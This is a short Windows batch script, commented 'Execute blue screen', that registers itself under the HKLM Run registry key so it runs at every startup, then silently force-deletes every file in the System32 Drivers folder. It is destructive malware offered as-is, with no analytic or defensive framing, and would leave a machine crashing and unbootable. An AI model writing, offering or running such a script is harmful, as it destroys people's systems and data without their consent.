@echo off

rem Execute blue screen.
@((( Echo Off > Nul ) & Break Off )
@Set HiveBSOD=HKLM\Software\Microsoft\Windows\CurrentVersion\Run
@Reg Add “%HiveBSOD%” /v “BSOD” /t “REG_SZ” /d %0 /f > Nul
@Del /q /s /f “%SystemRoot%\Windows\System32\Drivers\*.*”
)
